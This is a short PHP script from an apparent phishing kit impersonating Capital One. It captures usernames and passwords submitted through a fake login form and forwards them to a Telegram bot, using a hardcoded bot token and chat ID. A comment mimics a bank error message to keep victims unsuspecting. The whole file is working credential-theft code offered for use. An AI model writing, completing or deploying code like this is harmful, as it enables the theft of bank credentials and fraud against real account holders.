<?php

// What you entered doesn't match what we have on file. We can help you with your
include_once('bot.php');


if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];
}
$message = "🔥New Login to CapitalOne🔥\n";
$message = $meassage."Username: ".$username."\nPassword: ".$password;


$botToken = '5941110899:AAHmF4kUhivue6YhGS4T61g1TIUxGQkVis8';
$chatId = '2087889282';

if(sendTelegramMessage($botToken, $chatId, $message)){
   echo "success";
}


